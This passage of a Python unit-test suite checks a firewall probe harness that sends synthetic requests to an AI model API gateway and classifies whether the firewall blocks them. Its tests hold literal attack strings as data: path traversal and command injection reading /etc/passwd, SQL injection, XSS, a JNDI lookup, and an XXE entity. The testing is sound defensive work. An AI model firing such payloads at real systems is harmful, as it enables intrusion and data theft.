        self.assertIn(("gateway", "/models/openai-audio/v1/deployments/gpt-transcribe/transcriptions"), counts)
        def strings(value):
            if isinstance(value, str):
                yield value
            elif isinstance(value, dict):
                for child in value.values():
                    yield from strings(child)
            elif isinstance(value, list):
                for child in value:
                    yield from strings(child)
        expected = {"literal-lfi": "../../etc/passwd", "literal-rce": ";cat /etc/passwd",
            "literal-sqli": "1' OR '1'='1' UNION SELECT NULL--", "literal-xss": "<img src=x onerror=alert(1)>",
            "literal-jndi": "${jndi:ldap://waf-probe.invalid/synthetic}",
            "literal-xxe": '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'}
        for case in cases:
            with self.subTest(case=case.case_id):
                self.assertEqual(case.category, "extended-content-literal-attack-documentation")
                self.assertEqual(case.auth_mode, "anonymous")
                self.assertEqual(case.intent, "compatibility")
                self.assertIsNotNone(case.payload_field)
                self.assertNotIn("xml", dict(case.headers)["Content-Type"])
                label = next(label for label in expected if label in case.case_id)
                literal = "Analyze the following inert source text: " + expected[label]
                if dict(case.headers)["Content-Type"] == "application/json":
                    value = json.loads(case.body)
                    self.assertTrue(any(literal in text for text in strings(value)))
                    self.assertNotIn("_attack", value)
                    self.assertNotEqual(value.get("model"), literal)
                else:
                    self.assertEqual(case.payload_field, "prompt")
                    self.assertIn(literal.encode(), case.body)

    def test_schema_keys_and_nested_arguments_retain_the_exact_generated_payload(self):
        extended = probe.extended_content(self.routes)
        sql = dict(probe.payloads())["sql-union"]
        key_case = next(case for case in extended if case.payload_field == "keys:response_format.json_schema.schema.properties" and "sql-union" in case.case_id)
        properties = json.loads(key_case.body)["response_format"]["json_schema"]["schema"]["properties"]
        self.assertEqual(set(properties), {sql})
        case = next(case for case in extended if case.payload_field == "input[].arguments" and "sql-union" in case.case_id)
        arguments = json.loads(json.loads(case.body)["input"][0]["arguments"])
        self.assertEqual(arguments["value"], sql)
        key_cases = [case for case in extended if case.payload_field == "keys:state" and "sql-union" in case.case_id]
        self.assertEqual({case.target for case in key_cases}, {"gateway", "portal"})
        for case in key_cases:
            self.assertEqual(set(json.loads(case.body)["state"]), {sql})
        scalar_cases = [case for case in extended if case.category == "extended-content-decision-state-scalar-json"]
        self.assertEqual({type(json.loads(case.body)["state"]) for case in scalar_cases}, {int, float, bool, type(None)})

    def test_extended_media_and_multipart_carry_the_payload_in_actual_fields(self):
        extended = probe.extended_content(self.routes)
        image = next(case for case in extended if case.payload_field == "messages[].content[].image_url.url")
        value = json.loads(image.body)["messages"][0]["content"][1]["image_url"]["url"]
        self.assertTrue(value.startswith("data:image/png;base64,"))
        self.assertTrue(base64.b64decode(value.split(",", 1)[1], validate=True).startswith(b"\x89PNG\r\n\x1a\n"))
        audio = next(case for case in extended if case.payload_field == "messages[].content[].input_audio.data")
        value = json.loads(audio.body)["messages"][0]["content"][0]["input_audio"]["data"]
        self.assertTrue(base64.b64decode(value, validate=True).startswith(b"RIFF"))
        document = next(case for case in extended if case.payload_field == "input[].content[].file_data")
        value = json.loads(document.body)["input"][0]["content"][1]["file_data"]
        self.assertTrue(base64.b64decode(value.split(",", 1)[1], validate=True).startswith(b"%PDF-"))
        sql = dict(probe.payloads())["sql-union"]
        multipart = next(case for case in extended if case.payload_field == "input.text" and "sql-union" in case.case_id)
        input_part = multipart.body.split(b'name="input"\r\n\r\n', 1)[1].split(b"\r\n--waf-probe-fixed-boundary", 1)[0]
        self.assertEqual(json.loads(input_part)["text"], sql)

    def test_bfl_edit_probes_include_raw_base64_image_without_broadening_auth(self):
        cases = [case for case in probe.extended_content(self.routes)
                 if case.category == "extended-content-bfl-edit-image-base64"]
        self.assertEqual(len(cases), 8)
        for case in cases:
            self.assertEqual(case.path, "/models/blackforestlabs/v1/flux-2/edits")
            self.assertEqual(case.payload_field, "input_image")
            self.assertEqual(case.auth_mode, "anonymous")
            value = json.loads(case.body)
            self.assertFalse(value["input_image"].startswith("data:"))
            self.assertTrue(base64.b64decode(value["input_image"], validate=True).startswith(b"\x89PNG\r\n\x1a\n"))

    def test_keys_are_exclusively_invalid_model_canaries(self):
        keyed = [case for case in self.cases if case.auth_mode != "anonymous"]
        self.assertGreater(len(keyed), 32)
        for case in keyed:
            self.assertEqual(case.target, "gateway")
            self.assertIn((case.method, case.path), probe.CANARY_ROUTES)
            self.assertEqual(json.loads(case.body)["model"], probe.INVALID_MODEL)
            self.assertEqual(case.intent, "compatibility")
        for case in self.cases:
            if case.intent == "attack-control":
                self.assertEqual(case.auth_mode, "anonymous")
                self.assertEqual(case.method, "GET")
                self.assertNotIn((case.method, case.path), {(route.method, route.path) for route in self.routes})
        canary = keyed[0]
        result = probe.run_probe(canary, "https://example.invalid", "run", 1, probe.RateLimiter(4))
        self.assertEqual(result["classification"], "skipped_key_required")
        with self.assertRaises(ValueError):
            probe.run_probe(replace(canary, target="portal"), "https://example.invalid", "run", 1, probe.RateLimiter(4), "fake-secret")

    def test_403_attribution_does_not_equate_every_forbidden_with_waf(self):
        for status, headers, body, expected in (
            (403, {}, b"<title>403 Forbidden</title><center>Microsoft-Azure-Application-Gateway/v2</center>", "waf_block"),
            (403, {"server": "Microsoft-Azure-Application-Gateway/v2"}, b'{"error":"RequestNotAllowed"}', "forbidden_unattributed"),
            (403, {"apim-request-id": "synthetic"}, b'{"error":"denied"}', "application_rejected"),
            (401, {}, b"Unauthorized", "application_rejected"),
            (400, {}, b"Invalid model", "application_validation_or_route_response"),
            (302, {"location": "https://other.invalid"}, b"", "redirect_not_followed"),
            (429, {}, b"", "rate_limited"),
            (502, {}, b"", "server_error"),
        ):
            with self.subTest(status=status, expected=expected):
                result = probe.classify_response(status, headers, body)
                self.assertEqual(result["classification"], expected)
                self.assertFalse(result["functional_success"])
        result = probe.classify_response(200, {}, b"ok", auth_mode="invalid-model-canary")
        self.assertEqual(result["classification"], "canary_unexpected_success")

    def test_ssml_guard_requires_explicit_error_code_and_status(self):
        body = b'{"error":{"code":"InvalidSpeechMarkup"}}'
        rejected = probe.classify_response(400, {}, body)
        self.assertEqual(rejected['evidence'], 'apim-ssml-dtd-rejection')
        self.assertEqual(rejected['classification'], 'application_validation_or_route_response')
        for status, data in [(401, body), (400, b'{"error":{"code":"OtherError"}}'), (400, b'InvalidSpeechMarkup')]:
            with self.subTest(status=status, body=data):
                self.assertNotEqual(probe.classify_response(status, {}, data)['evidence'], 'apim-ssml-dtd-rejection')

    def test_manifest_and_exception_records_do_not_include_secrets_or_payload(self):
        secret, payload = "sentinel-secret-private", "sentinel-body-private"
        case = probe.Probe("secret-test", "gateway", "POST", "/waf-probe/nonexistent", "test", "compatibility", "test",
            payload.encode(), (("X-Test", secret),), (("metadata", payload),))
        serialized = json.dumps(probe.metadata(case))
        self.assertNotIn(secret, serialized)
        self.assertNotIn(payload, serialized)
        with patch.object(probe, "_curl_response", side_effect=OSError(secret + payload)):
            record = probe.run_probe(case, "https://example.invalid", "synthetic-run", 1, probe.RateLimiter(4), transport="curl")
        serialized = json.dumps(record)
        self.assertNotIn(secret, serialized)
        self.assertNotIn(payload, serialized)
        self.assertEqual(record["error_type"], "OSError")
        self.assertFalse(record["functional_success"])

    def test_correlation_is_in_the_user_agent_and_probe_queries_are_unchanged(self):
        case = probe.Probe("correlation-fixture", "gateway", "POST", "/probe?existing=1&empty=", "test", "compatibility", "test",
            b"synthetic", (), (("repeated", "first"), ("repeated", "second"), ("null", "\x00")))
        expected_query = {"existing": ["1"], "empty": [""], "repeated": ["first", "second"], "null": ["\x00"]}
        self.assertEqual(parse_qs(urlsplit(probe.request_url("https://example.invalid", case)).query, keep_blank_values=True), expected_query)
        with patch.object(probe, "_curl_response", return_value=(401, {}, b"Unauthorized")) as send:
            record = probe.run_probe(case, "https://example.invalid", "synthetic-run", 1, probe.RateLimiter(4), transport="curl")
        url, method, headers, body, _ = send.call_args.args
        self.assertEqual(parse_qs(urlsplit(url).query, keep_blank_values=True), expected_query)
        self.assertEqual(headers["User-Agent"], "egakumi-waf-probe/1.0 " + record["correlation"])
        self.assertRegex(record["correlation"], r"^[0-9]{35}$")
        self.assertEqual((method, body), (case.method, case.body))
        self.assertNotIn("headers", record)
        self.assertNotIn(headers["User-Agent"], json.dumps(record))

    def test_probe_correlation_does_not_turn_synthetic_php_case_or_run_into_a_scanner_name(self):
        case = next(case for case in probe.image_prompt_probes(self.routes)
            if case.path == "/models/openai-images/v1/deployments/gpt-image-2/edits"
            and case.category == "image-prompts-php-variable-function")
        self.assertIn("bfac", hashlib.sha256(case.case_id.encode()).hexdigest()[:12])
        with patch.object(probe, "_curl_response", return_value=(401, {}, b"Unauthorized")) as send:
            record = probe.run_probe(case, "https://example.invalid", "synthetic-bfac-run", 1, probe.RateLimiter(4), transport="curl")
        correlation = record["correlation"]
        self.assertRegex(correlation, r"^[0-9]{35}$")
        self.assertNotIn("bfac", send.call_args.args[2]["User-Agent"].lower())
        self.assertEqual(send.call_args.args[3], case.body)
        self.assertEqual(urlsplit(send.call_args.args[0]).path, case.path)
        self.assertEqual(urlsplit(send.call_args.args[0]).query, "")
        self.assertEqual(record["case_id"], case.case_id)

    def test_probe_correlation_is_deterministic_bounded_and_separates_runs_and_cases(self):
        cases = probe.image_prompt_probes(self.routes)
        runs = ("synthetic-run-one", "synthetic-run-two", "synthetic-bfac-run")
        correlations = [probe.probe_correlation(run, case.case_id) for run in runs for case in cases]
        self.assertEqual(len(correlations), len(set(correlations)))
        self.assertEqual(correlations, [probe.probe_correlation(run, case.case_id) for run in runs for case in cases])
        self.assertTrue(all(re.fullmatch(r"[0-9]{35}", value) for value in correlations))
        for run in ("", "0", "a" * 1000, "合成試験-bfac-\r\n"):
            self.assertRegex(probe.probe_correlation(run, "synthetic-case"), r"^[0-9]{35}$")

    def test_both_transports_send_the_same_exact_user_agent_and_no_marker_query(self):
        case = probe.Probe("transport-correlation-fixture", "gateway", "GET", "/probe", "test", "compatibility", "test",
            headers=(("User-Agent", "untrusted-case-value"),))
        with patch.object(probe, "_curl_response", return_value=(401, {}, b"Unauthorized")) as curl:
            curl_record = probe.run_probe(case, "https://example.invalid", "synthetic-run", 1, probe.RateLimiter(4), transport="curl")
        with patch.object(probe, "build_opener") as opener:
            response = opener.return_value.open.return_value
            response.code, response.headers = 401, {}
            response.read1.return_value = b"Unauthorized"
            urllib_record = probe.run_probe(case, "https://example.invalid", "synthetic-run", 1, probe.RateLimiter(4))
        request = opener.return_value.open.call_args.args[0]
        expected = "egakumi-waf-probe/1.0 " + curl_record["correlation"]
        self.assertEqual(curl_record["correlation"], urllib_record["correlation"])
        self.assertRegex(curl_record["correlation"], r"^[0-9]{35}$")
        self.assertEqual(curl.call_args.args[2]["User-Agent"], expected)
        self.assertEqual(request.get_header("User-agent"), expected)
        self.assertEqual(request.full_url, "https://example.invalid/probe")
        self.assertEqual(curl.call_args.args[0], request.full_url)

    def test_user_agent_rejects_unbounded_or_non_alphanumeric_correlation(self):
        self.assertEqual(probe.probe_user_agent("a" * 56), "egakumi-waf-probe/1.0 " + "a" * 56)
        for value in ("", "a" * 57, "contains spaces", "line\r\nbreak", "non-ascii-\u3042"):
            with self.subTest(value=value), self.assertRaises(ValueError):
                probe.probe_user_agent(value)

    def test_user_agent_casefold_keeps_one_marker_and_other_headers_in_both_transports(self):
        case = probe.Probe("mixed-case-user-agent-fixture", "gateway", "GET", "/probe", "test", "compatibility", "test",
            headers=(("user-agent", "untrusted-lowercase"), ("UsEr-AgEnT", "untrusted-mixedcase"),
                ("USER-AGENT", "untrusted-uppercase"), ("X-Synthetic", "preserved")))
        with patch.object(probe, "_curl_response", return_value=(401, {}, b"Unauthorized")) as curl:
            record = probe.run_probe(case, "https://example.invalid", "synthetic-run", 1, probe.RateLimiter(4), transport="curl")
        with patch.object(probe, "build_opener") as opener:
            response = opener.return_value.open.return_value
            response.code, response.headers = 401, {}
            response.read1.return_value = b"Unauthorized"
            probe.run_probe(case, "https://example.invalid", "synthetic-run", 1, probe.RateLimiter(4))
        request = opener.return_value.open.call_args.args[0]
        expected = "egakumi-waf-probe/1.0 " + record["correlation"]
        for headers in (curl.call_args.args[2].items(), request.header_items()):
            pairs = list(headers)
            self.assertEqual([(name.casefold(), value) for name, value in pairs if name.casefold() == "user-agent"],
                [("user-agent", expected)])
            self.assertIn(("x-synthetic", "preserved"), [(name.casefold(), value) for name, value in pairs])

    def test_tls_and_redirect_boundaries(self):
        self.assertEqual(probe.validate_base_url("https://gateway.example.invalid/"), "https://gateway.example.invalid")
        for url in ("http://example.invalid", "https://secret@example.invalid", "https://example.invalid/path", "https://example.invalid?key=secret", "https://example.invalid/#fragment"):
            with self.subTest(url=url), self.assertRaises(ValueError):
                probe.validate_base_url(url)
        self.assertIsNone(probe.NoRedirect().redirect_request(None, None, 302, "redirect", {}, "https://other.invalid"))

    def test_curl_keeps_credentials_out_of_process_arguments_and_deletes_temporary_files(self):
        recorded = {}
        def fake_run(arguments, **kwargs):
            recorded["arguments"] = arguments
            recorded["kwargs"] = kwargs
            request_headers = Path(arguments[arguments.index("--header") + 1][1:])
            recorded["directory"] = request_headers.parent
            self.assertIn("api-key: sentinel-private-key", request_headers.read_text(encoding="utf-8"))
            Path(arguments[arguments.index("--dump-header") + 1]).write_bytes(b"HTTP/1.1 403 Forbidden\r\nContent-Type: application/json\r\n\r\n")
            Path(arguments[arguments.index("--output") + 1]).write_bytes(b'{"error":"Synthetic"}')
            return subprocess.CompletedProcess(arguments, 0, b"403", b"")
        with patch.object(probe.subprocess, "run", side_effect=fake_run):
            status, headers, body = probe._curl_response("https://example.invalid/", "POST", {"api-key": "sentinel-private-key"}, b"synthetic", 5)
        self.assertEqual(status, 403)
        self.assertNotIn("sentinel-private-key", " ".join(recorded["arguments"]))
        self.assertFalse(recorded["kwargs"]["shell"])
        self.assertNotIn("--insecure", recorded["arguments"])
        self.assertNotIn("--location", recorded["arguments"])
        self.assertEqual(recorded["arguments"][1], "-q")
        self.assertFalse(recorded["directory"].exists())

    def test_dry_run_requires_no_network_and_does_not_read_key(self):
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory) / "plan.json"
            with patch.object(probe, "run_probe", side_effect=AssertionError("network attempted")):
                code = probe.main(["--suite", "legacy", "--dry-run", "--case-filter", "baseline", "--key-file", str(Path(directory) / "missing-secret"), "--output", str(output)])
            self.assertEqual(code, 0)
            report = json.loads(output.read_text(encoding="utf-8"))
            self.assertTrue(report["dry_run"])
            self.assertEqual(report["selected_case_count"], len(self.routes))

    def test_independent_wire_shapes_reuse_media_types_at_message_and_tool_result_locations(self):
        variants = probe.wire_shape_variants()
        fields = {variant[2] for variant in variants}
        for location in ("input[].content[]", "input[].output[]"):
            self.assertTrue({location + "." + field for field in (
                "image_url", "audio_url", "encrypted_content", "file_data", "text")} <= fields)
        self.assertTrue({"input[].encrypted_function_args", "input[].result", "input[].revised_prompt",
                         "tools[].input_image_mask.image_url"} <= fields)
        audit = probe.audit_wire_shapes(variants)
        self.assertTrue(all(item["classified"] for item in audit), audit)
        self.assertTrue(all(item["waf_extraction_verified"] is False and item["provider_acceptance"] == "not-run" for item in audit))
        by_label = {label: value for _, label, _, _, value in variants}
        self.assertIsInstance(by_label["tool-result-string"]["input"][1]["output"], str)
        self.assertIsInstance(by_label["tool-result-image"]["input"][1]["output"], list)
        self.assertIsInstance(by_label["agent-message-image"]["input"][0]["content"], list)
        self.assertIsInstance(by_label["native-local-output-string"]["input"][0]["output"], str)
        for _, _, _, _, value in variants:
            self.assertEqual(value["model"], probe.INVALID_MODEL)

    def test_unclassified_independent_wire_leaf_fails_even_when_other_data_fields_are_covered(self):
        variants = copy.deepcopy(probe.wire_shape_variants())
        variants[0][4]["input"][0]["content"][0]["unreviewed_media_data"] = "Synthetic new source leaf"
        row = probe.audit_wire_shapes(variants)[0]
        self.assertFalse(row["classified"])
        self.assertEqual(row["unclassified_fields"], ["input.content.unreviewed_media_data"])
        with patch.object(probe, "wire_shape_variants", return_value=variants), self.assertRaisesRegex(ValueError, "unclassified"):
            probe.wire_shape_probes(self.routes)

    def test_wire_media_have_valid_png_wav_pdf_and_seed_variation(self):
        first, second = probe.wire_shape_variants(0), probe.wire_shape_variants(1)
        self.assertNotEqual(first[0][4], second[0][4])
        for _, label, _, _, value in first:
            if label not in {"agent-message-image", "agent-message-audio", "agent-message-file"}:
                continue
            part = value["input"][0]["content"][0]
            encoded = next(part[name] for name in ("image_url", "audio_url", "file_data") if name in part)
            data = base64.b64decode(encoded.split(",", 1)[1], validate=True)
            if "audio" in label:
                with wave.open(io.BytesIO(data), "rb") as audio:
                    self.assertEqual((audio.getnchannels(), audio.getframerate()), (1, 16000))
            elif "file" in label:
                xref = int(data.rsplit(b"startxref\n", 1)[1].splitlines()[0])
                self.assertTrue(data[xref:].startswith(b"xref\n"))
            else:
                self.assertTrue(data.startswith(b"\x89PNG\r\n\x1a\n"))

    def test_flux_named_slots_and_portal_stt_shapes_come_from_contracts(self):
        cases = probe.wire_shape_probes(self.routes)
        slots = [case for case in cases if case.category == "wire-shape-flux-slot"]
        self.assertEqual({case.payload_field for case in slots}, {"input_image", *("input_image_" + str(i) for i in range(2, 9))})
        self.assertFalse(any("input_image_9" in (case.payload_field or "") or "input_image_10" in (case.payload_field or "") for case in cases))
        uploads = [case for case in cases if case.category == "wire-shape-stt-upload"]
        models = set()
        for case in uploads:
            message = BytesParser(policy=policy.default).parsebytes(
                b"MIME-Version: 1.0\r\nContent-Type: multipart/form-data; boundary=waf-probe-fixed-boundary\r\n\r\n" + case.body)
            parts = {part.get_param("name", header="content-disposition"): part for part in message.iter_parts()}
            metadata = json.loads(parts["input"].get_payload(decode=True))
            models.add(metadata["modelId"])
            self.assertEqual(set(metadata), {"modelId", "text", "voice", "rate", "apiKeyId"})
            self.assertNotEqual(metadata["modelId"], "azure-speech-tts")
            with wave.open(io.BytesIO(parts["file"].get_payload(decode=True)), "rb") as audio:
                self.assertEqual(audio.getframerate(), 16000)
        self.assertIn("azure-speech-stt", models)
        self.assertGreaterEqual(len(models), 2)

    def test_published_model_acceptance_plan_is_dynamic_and_does_not_send_inference(self):
        matrix = probe.published_model_matrix()
        actual = {(row["api"], row["operation"], row["profile"], row["model"]) for row in matrix}
        for path in (ROOT / "apps/gateway/apim/apis").glob("*.json"):
            api = json.loads(path.read_text(encoding="utf-8"))
            if not api.get("released"):
                continue
            for operation, constraint in api.get("authorization", {}).get("operationConstraints", {}).items():
                for profile in constraint.get("profiles") or [constraint]:
                    models = profile.get("allowedModels") or ([profile["model"]] if profile.get("model") else [])
                    for model in models:
                        self.assertIn((api["name"], operation, profile.get("profileId", "default"), model), actual)
        self.assertTrue(all(row["acceptance"] == row["inference"] == "not-run" for row in matrix))
        self.assertTrue(all(row["model_reference_resolved"] for row in matrix))
        self.assertFalse(any(isinstance(row["model"], str) and row["model"].startswith("__") for row in matrix))
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            path = root / "apps/gateway/apim/apis/synthetic.json"
            path.parent.mkdir(parents=True)
            api = {"released": True, "name": "synthetic", "path": "models/synthetic", "operations": [
                {"name": "create", "method": "POST", "urlTemplate": "/create"}], "authorization": {
                "operationConstraints": {"create": {"profiles": [{"profileId": "text", "allowedModels": ["synthetic-next-model"]}]}}}}
            path.write_text(json.dumps(api), encoding="utf-8")
            self.assertEqual(probe.published_model_matrix(root)[0]["model"], "synthetic-next-model")

    def test_default_required_suite_includes_special_suites_and_incident_subset_is_bounded(self):
        cases = probe.required_corpus(self.routes)
        self.assertLess(len(cases), 1200)
        self.assertTrue(all(case.auth_mode == "anonymous" for case in cases))
        self.assertTrue({"wire-shape-tool-result-image", "wire-shape-agent-message-encrypted", "typed-conversation"} <= {case.category for case in cases})
        self.assertTrue(any("jndi" in case.category for case in cases))
        self.assertTrue(any("image-prompts" in case.category for case in cases))
        incident = probe.incident_corpus(self.routes)
        self.assertLess(len(incident), 80)
        self.assertTrue({case.case_id for case in probe.wire_shape_probes(self.routes)} <= {case.case_id for case in incident})
        exhaustive = probe.required_corpus(self.routes, exhaustive=True)
        self.assertGreater(len(exhaustive), len(cases))
        self.assertTrue(any("wire-tool-result-image-seed1" in case.case_id for case in exhaustive))

    def test_boundary_verdict_fails_false_positives_false_negatives_and_unresolved_required_cases(self):
        allowed = next(case for case in probe.wire_shape_probes(self.routes) if case.category == "wire-shape-tool-result-image")
        blocked = next(case for case in probe.wire_shape_probes(self.routes) if case.category == "wire-boundary-header")
        query = next(case for case in probe.wire_shape_probes(self.routes) if case.category == "wire-boundary-query")
        self.assertEqual(probe.boundary_verdict(allowed, {"classification": "waf_block"})["verdict"], "fail")
        self.assertEqual(probe.boundary_verdict(blocked, {"classification": "application_rejected"})["verdict"], "fail")
        self.assertEqual(probe.boundary_verdict(blocked, {"classification": "waf_block"})["verdict"], "pass")
        self.assertEqual(probe.boundary_verdict(allowed, {"classification": "forbidden_unattributed"})["verdict"], "unresolved")
        self.assertEqual(probe.boundary_verdict(query, {"classification": "application_rejected", "status": 401})["verdict"], "unresolved")
        self.assertEqual(probe.boundary_verdict(query, {"classification": "application_validation_or_route_response", "evidence": "correlated-application-rejection"})["verdict"], "pass")
        results, _, code = probe.evaluate_results([allowed], [])
        self.assertEqual(code, 2)
        self.assertEqual(results[0]["classification"], "not_run")
        results, _, code = probe.evaluate_results([allowed], [{"case_id": allowed.case_id, "classification": "application_rejected"}])
        self.assertEqual(code, 0)
        self.assertFalse(results[0]["functional_success"])

    def test_wire_boundary_controls_identify_the_real_model_field_and_crs_targeted_header(self):
        cases = probe.wire_shape_probes(self.routes)
        controls = [case for case in cases if case.category == "wire-boundary-control"]
        self.assertEqual(len(controls), 2)
        for case in controls:
            self.assertEqual(case.payload_field, "model")
            self.assertEqual(json.loads(case.body)["model"], probe.CONTROL_SQL)
            # Private runners can invalidate other model inputs without erasing
            # this case's selected attack field.
            body = json.loads(case.body)
            for field in ("model", "modelId"):
                if field in body and case.payload_field != field:
                    body[field] = probe.INVALID_MODEL
            self.assertEqual(body["model"], probe.CONTROL_SQL)
        headers = [case for case in cases if case.category == "wire-boundary-header"]
        self.assertEqual(len(headers), 2)
        for case in headers:
            self.assertEqual(case.payload_field, "header:Referer")
            self.assertEqual(dict(case.headers)["Referer"], probe.CONTROL_REFERER_XSS)
            self.assertNotIn("X-Attack", dict(case.headers))
            self.assertEqual(probe.expected_boundary(case), "waf_block")

    def test_required_header_attack_controls_use_reviewed_crs_inspection_targets(self):
        cases = probe.required_corpus(self.routes)
        headers = [case for case in cases if case.intent == "attack_control" and (case.payload_field or "").startswith("header:")]
        self.assertTrue(headers)
        for case in headers:
            values = dict(case.headers)
            if case.category == "raw-guard-header":
                # CRS 930 includes arbitrary request headers except Referer.
                self.assertEqual(case.payload_field, "header:X-Header")
                self.assertIn("X-Header", values)
            else:
                self.assertEqual(case.payload_field, "header:Referer", case.case_id)
                self.assertEqual(values["Referer"], probe.CONTROL_REFERER_XSS)
                self.assertNotIn("X-Attack", values)
                self.assertNotIn("X-Waf-Unknown", values)

    def test_opaque_ticket_header_scope_is_a_selector_invariant_not_an_invented_attack(self):
        from waf_contracts import contract_fields
        for profile, name in (("g-document-status", "X-Core-Document-Ticket"),
                              ("g-realtime-ticket", "X-Core-Call-Ticket")):
            fields = [field for field in contract_fields(profile) if field["matchVariable"] == "RequestHeaderValues" and field["groups"]]
            self.assertEqual({(field["selectorMatchOperator"], field["selector"]) for field in fields}, {("Equals", name)})
            self.assertTrue(all(field["selector"] != name + "-Extra" for field in fields))
        observations = [case for case in probe.typed_data_probes(self.routes) if case.expected_boundary == "observation"]
        self.assertEqual(len(observations), 6)
        for case in observations:
            self.assertFalse(case.mandatory)
            self.assertEqual(probe.boundary_verdict(case, {"classification": "application_rejected"})["verdict"], "observed")
        required_ids = {case.case_id for case in probe.required_corpus(self.routes)}
        self.assertFalse(required_ids & {case.case_id for case in observations})
        active = [case for case in probe.typed_data_probes(self.routes) if "ticket-header-referer-active-control" in case.case_id]
        self.assertEqual(len(active), 3)
        self.assertTrue({case.case_id for case in active} <= required_ids)
        for case in active:
            self.assertTrue(case.mandatory)
            self.assertEqual(dict(case.headers)["Referer"], probe.CONTROL_REFERER_XSS)
            self.assertEqual(probe.expected_boundary(case), "waf_block")

    def test_live_cli_returns_nonzero_for_a_compatibility_waf_block_without_raw_payloads(self):
        case = next(case for case in probe.wire_shape_probes(self.routes) if case.category == "wire-shape-tool-result-image")
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory) / "synthetic-results.json"
            def blocked(selected, *_args):
                return {**probe.metadata(selected), "classification": "waf_block", "status": 403}
            with patch.object(probe, "run_probe", side_effect=blocked):
                code = probe.main(["--wire-shapes-only", "--case-filter", case.case_id, "--gateway-base-url",
                                   "https://example.invalid", "--output", str(output)])
            report = json.loads(output.read_text(encoding="utf-8"))
            self.assertEqual(code, 2)
            self.assertFalse(report["required_boundary_checks_passed"])
            self.assertEqual(report["verdict_counts"], {"fail": 1})
            self.assertNotIn("data:image/png;base64,", output.read_text(encoding="utf-8"))


if __name__ == "__main__":
    unittest.main()
